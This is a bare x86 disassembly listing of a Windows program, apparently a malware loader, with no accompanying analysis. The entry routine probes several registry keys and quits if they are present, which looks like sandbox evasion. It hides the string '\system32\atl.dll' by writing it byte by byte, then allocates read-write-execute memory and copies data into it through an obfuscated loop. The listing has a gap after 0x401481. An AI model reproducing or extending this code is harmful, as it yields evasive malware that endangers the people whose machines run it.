0x00401000:	pushl	%ebp	; from: 0x004013df(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	movl	$0x40520d, 0x00402210
0x0040100d:	popl	%ebp
0x0040100e:	ret	; targets: 0x004013e4(MAY)

0x00401020:	pushl	%ebp	; from: 0x004013eb(MAY)
0x00401021:	movl	%esp, %ebp
0x00401023:	movl	0x8(%ebp), %eax
0x00401026:	movl	-4(%eax), %eax
0x00401029:	popl	%ebp
0x0040102a:	ret	; targets: 0x004013f0(MAY)

0x00401100:	pushl	%ebp	; from: 0x00401481(MAY)
0x00401101:	movl	%esp, %ebp
0x00401103:	subl	$0xc, %esp
0x00401106:	movl	$0x3f, -4(%ebp)
0x0040110d:	movl	$0x1043f, -4(%ebp)
0x00401114:	movl	$0x0, -12(%ebp)
0x0040111b:	jmp	0x00401126	; targets: 0x00401126(MAY)
0x0040111d:	movl	-12(%ebp), %eax	; from: 0x0040115a(MAY)
0x00401120:	addl	$0x1, %eax
0x00401123:	movl	%eax, -12(%ebp)
0x00401126:	movl	-12(%ebp), %ecx	; from: 0x0040111b(MAY)
0x00401129:	cmpl	0x10(%ebp), %ecx
0x0040112c:	jnl	0x0040115c	; targets: 0x0040112e(MAY), 0x0040115c(MAY)
0x0040112e:	movl	$0x1043f, -4(%ebp)	; from: 0x0040112c(MAY)
0x00401135:	movl	0xc(%ebp), %edx
0x00401138:	addl	-12(%ebp), %edx
0x0040113b:	movzbl	(%edx), %eax
0x0040113e:	movl	%eax, -8(%ebp)
0x00401141:	movl	$0x1043f, -4(%ebp)
0x00401148:	movl	0x8(%ebp), %ecx
0x0040114b:	addl	-12(%ebp), %ecx
0x0040114e:	movb	-8(%ebp), %dl
0x00401151:	movb	%dl, (%ecx)
0x00401153:	movl	$0x1043f, -4(%ebp)
0x0040115a:	jmp	0x0040111d	; targets: 0x0040111d(MAY)
0x0040115c:	movl	%ebp, %esp	; from: 0x0040112c(MAY)
0x0040115e:	popl	%ebp
0x0040115f:	ret	; targets: unresolved

0x00401160:	pushl	%ebp	; from: 0x00401400(MAY)
0x00401161:	movl	%esp, %ebp
0x00401163:	pushl	%ecx
0x00401164:	movl	$0x4, -4(%ebp)
0x0040116b:	pushl	$0x40
0x0040116d:	pushl	$0x3000
0x00401172:	movl	0x8(%ebp), %eax
0x00401175:	pushl	%eax
0x00401176:	pushl	$0x0
0x00401178:	call	VirtualAlloc@kernel32.dll	; targets: 0xff000040(MAY)
0x0040117e:	movl	%ebp, %esp
0x00401180:	popl	%ebp
0x00401181:	ret	; targets: 0x00401405(MAY)

0x00401190:	pushl	%ebp	; from: 0x0040141e(MAY)
0x00401191:	movl	%esp, %ebp
0x00401193:	popl	%ebp
0x00401194:	ret	; targets: 0x00401423(MAY)

0x004011a0:	pushl	%ebp	; from: 0x00401452(MAY)
0x004011a1:	movl	%esp, %ebp
0x004011a3:	subl	$0x8, %esp
0x004011a6:	movl	0x8(%ebp), %eax
0x004011a9:	movl	%eax, -4(%ebp)
0x004011ac:	movl	0xc(%ebp), %ecx
0x004011af:	movl	%ecx, -8(%ebp)
0x004011b2:	movl	-4(%ebp), %edx
0x004011b5:	cmpl	-8(%ebp), %edx
0x004011b8:	jae	0x004011c1	; targets: 0x004011ba(MAY)
0x004011ba:	movl	-4(%ebp), %eax	; from: 0x004011b8(MAY)
0x004011bd:	jmp	0x004011c4	; targets: 0x004011c4(MAY)
0x004011c4:	movl	%ebp, %esp	; from: 0x004011bd(MAY)
0x004011c6:	popl	%ebp
0x004011c7:	ret	; targets: 0x00401457(MAY)


start:
0x00401260:	pushl	%ebp
0x00401261:	movl	%esp, %ebp
0x00401263:	subl	$0x16c, %esp
0x00401269:	pusha	
0x0040126a:	movl	%ebp, 0x00402218
0x00401270:	movl	$0x0, -324(%ebp)
0x0040127a:	movl	CreateFileA@kernel32.dll, %eax
0x0040127f:	movl	%eax, -344(%ebp)
0x00401285:	movl	$0x0, -276(%ebp)
0x0040128f:	movl	$0x64, -316(%ebp)
0x00401299:	movl	$0x1, -284(%ebp)
0x004012a3:	movl	$0x0, -324(%ebp)
0x004012ad:	movl	$0x0, -292(%ebp)
0x004012b7:	movl	$0x1, -312(%ebp)
0x004012c1:	movl	$0x3, -280(%ebp)
0x004012cb:	pushl	$0x104
0x004012d0:	leal	-272(%ebp), %ecx
0x004012d6:	pushl	%ecx
0x004012d7:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000010(MAY)
0x004012dd:	call	0x004016a0	; targets: 0x004016a0(MAY)
0x004012e2:	leal	-296(%ebp), %edx	; from: 0x00401747(MAY)
0x004012e8:	pushl	%edx
0x004012e9:	pushl	$0x20019
0x004012ee:	pushl	$0x0
0x004012f0:	pushl	$0x40206c
0x004012f5:	pushl	$0x80000002
0x004012fa:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000030(MAY)
0x00401300:	testl	%eax, %eax
0x00401302:	je	0x00401313	; targets: 0x00401313(MAY), 0x00401304(MAY)
0x00401304:	pushl	$0x4	; from: 0x00401302(MAY)
0x00401306:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000050(MAY)
0x0040130c:	xorl	%eax, %eax
0x0040130e:	jmp	0x0040168d	; targets: 0x0040168d(MAY)
0x00401313:	leal	-296(%ebp), %eax	; from: 0x00401302(MAY)
0x00401319:	pushl	%eax
0x0040131a:	pushl	$0x20019
0x0040131f:	pushl	$0x0
0x00401321:	pushl	$0x402080
0x00401326:	movl	-296(%ebp), %ecx
0x0040132c:	pushl	%ecx
0x0040132d:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000030(MAY)
0x00401333:	testl	%eax, %eax
0x00401335:	je	0x00401346	; targets: 0x00401337(MAY), 0x00401346(MAY)
0x00401337:	pushl	$0x4	; from: 0x00401335(MAY)
0x00401339:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000050(MAY)
0x0040133f:	xorl	%eax, %eax
0x00401341:	jmp	0x0040168d	; targets: 0x0040168d(MAY)
0x00401346:	leal	-296(%ebp), %edx	; from: 0x00401335(MAY)
0x0040134c:	pushl	%edx
0x0040134d:	pushl	$0x20019
0x00401352:	pushl	$0x0
0x00401354:	pushl	$0x402090
0x00401359:	movl	-296(%ebp), %eax
0x0040135f:	pushl	%eax
0x00401360:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000030(MAY)
0x00401366:	testl	%eax, %eax
0x00401368:	je	0x00401379	; targets: 0x00401379(MAY), 0x0040136a(MAY)
0x0040136a:	pushl	$0x4	; from: 0x00401368(MAY)
0x0040136c:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000050(MAY)
0x00401372:	xorl	%eax, %eax
0x00401374:	jmp	0x0040168d	; targets: 0x0040168d(MAY)
0x00401379:	leal	-296(%ebp), %ecx	; from: 0x00401368(MAY)
0x0040137f:	pushl	%ecx
0x00401380:	pushl	$0x20019
0x00401385:	pushl	$0x0
0x00401387:	pushl	$0x4020b0
0x0040138c:	movl	-296(%ebp), %edx
0x00401392:	pushl	%edx
0x00401393:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000030(MAY)
0x00401399:	testl	%eax, %eax
0x0040139b:	je	0x004013ac	; targets: 0x004013ac(MAY), 0x0040139d(MAY)
0x0040139d:	pushl	$0x4	; from: 0x0040139b(MAY)
0x0040139f:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000050(MAY)
0x004013a5:	xorl	%eax, %eax
0x004013a7:	jmp	0x0040168d	; targets: 0x0040168d(MAY)
0x004013ac:	leal	-296(%ebp), %eax	; from: 0x0040139b(MAY)
0x004013b2:	pushl	%eax
0x004013b3:	pushl	$0x20019
0x004013b8:	pushl	$0x0
0x004013ba:	pushl	$0x40209c
0x004013bf:	movl	-296(%ebp), %ecx
0x004013c5:	pushl	%ecx
0x004013c6:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000030(MAY)
0x004013cc:	testl	%eax, %eax
0x004013ce:	jne	0x004013df	; targets: 0x004013d0(MAY), 0x004013df(MAY)
0x004013d0:	pushl	$0x4	; from: 0x004013ce(MAY)
0x004013d2:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000050(MAY)
0x004013d8:	xorl	%eax, %eax
0x004013da:	jmp	0x0040168d	; targets: 0x0040168d(MAY)
0x004013df:	call	0x00401000	; targets: 0x00401000(MAY)	; from: 0x004013ce(MAY)
0x004013e4:	movl	0x00402210, %edx	; from: 0x0040100e(MAY)
0x004013ea:	pushl	%edx
0x004013eb:	call	0x00401020	; targets: 0x00401020(MAY)
0x004013f0:	addl	$0x4, %esp	; from: 0x0040102a(MAY)
0x004013f3:	movl	%eax, -328(%ebp)
0x004013f9:	movl	-328(%ebp), %eax
0x004013ff:	pushl	%eax
0x00401400:	call	0x00401160	; targets: 0x00401160(MAY)
0x00401405:	addl	$0x4, %esp	; from: 0x00401181(MAY)
0x00401408:	movl	%eax, -320(%ebp)
0x0040140e:	movl	-328(%ebp), %ecx
0x00401414:	pushl	%ecx
0x00401415:	pushl	$0x0
0x00401417:	movl	-320(%ebp), %edx
0x0040141d:	pushl	%edx
0x0040141e:	call	0x00401190	; targets: 0x00401190(MAY)
0x00401423:	addl	$0xc, %esp	; from: 0x00401194(MAY)
0x00401426:	movl	-328(%ebp), %eax
0x0040142c:	movl	%eax, -336(%ebp)
0x00401432:	movl	-324(%ebp), %ecx
0x00401438:	cmpl	-328(%ebp), %ecx
0x0040143e:	jae	0x004014ca	; targets: 0x00401444(MAY)
0x00401444:	movl	-336(%ebp), %edx	; from: 0x0040143e(MAY)
0x0040144a:	pushl	%edx
0x0040144b:	movl	-316(%ebp), %eax
0x00401451:	pushl	%eax
0x00401452:	call	0x004011a0	; targets: 0x004011a0(MAY)
0x00401457:	addl	$0x8, %esp	; from: 0x004011c7(MAY)
0x0040145a:	movl	%eax, -340(%ebp)
0x00401460:	movl	-340(%ebp), %ecx
0x00401466:	pushl	%ecx
0x00401467:	movl	0x00402210, %edx
0x0040146d:	addl	-292(%ebp), %edx
0x00401473:	pushl	%edx
0x00401474:	movl	-320(%ebp), %eax
0x0040147a:	addl	-324(%ebp), %eax
0x00401480:	pushl	%eax
0x00401481:	call	0x00401100	; targets: 0x00401100(MAY)
0x0040168d:	movl	%ebp, %esp	; from: 0x0040130e(MAY), 0x00401374(MAY), 0x00401341(MAY), 0x004013da(MAY), 0x004013a7(MAY)
0x0040168f:	popl	%ebp
0x00401690:	ret	; targets: 0xfee70000(MAY)

0x004016a0:	pushl	%ebp	; from: 0x004012dd(MAY)
0x004016a1:	movl	%esp, %ebp
0x004016a3:	movl	0x00402014, %eax
0x004016a8:	movb	$0x73, 0x3(%eax)
0x004016ac:	movl	0x00402014, %ecx
0x004016b2:	movb	$0x74, 0x4(%ecx)
0x004016b6:	movl	0x00402014, %edx
0x004016bc:	movb	$0x65, 0x5(%edx)
0x004016c0:	movl	0x00402014, %eax
0x004016c5:	movb	$0x6d, 0x6(%eax)
0x004016c9:	movl	0x00402014, %ecx
0x004016cf:	movb	$0x33, 0x7(%ecx)
0x004016d3:	movl	0x00402014, %edx
0x004016d9:	movb	$0x32, 0x8(%edx)
0x004016dd:	movl	0x00402014, %eax
0x004016e2:	movb	$0x5c, 0x9(%eax)
0x004016e6:	movl	0x00402014, %ecx
0x004016ec:	movb	$0x61, 0xa(%ecx)
0x004016f0:	movl	0x00402014, %edx
0x004016f6:	movb	$0x74, 0xb(%edx)
0x004016fa:	movl	0x00402014, %eax
0x004016ff:	movb	$0x6c, 0xc(%eax)
0x00401703:	movl	0x00402014, %ecx
0x00401709:	movb	$0x2e, 0xd(%ecx)
0x0040170d:	movl	0x00402014, %edx
0x00401713:	movb	$0x64, 0xe(%edx)
0x00401717:	movl	0x00402014, %eax
0x0040171c:	movb	$0x6c, 0xf(%eax)
0x00401720:	movl	0x00402014, %ecx
0x00401726:	movb	$0x6c, 0x10(%ecx)
0x0040172a:	movl	0x00402014, %edx
0x00401730:	movb	$0x5c, (%edx)
0x00401733:	movl	0x00402014, %eax
0x00401738:	movb	$0x73, 0x1(%eax)
0x0040173c:	movl	0x00402014, %ecx
0x00401742:	movb	$0x79, 0x2(%ecx)
0x00401746:	popl	%ebp
0x00401747:	ret	; targets: 0x004012e2(MAY)

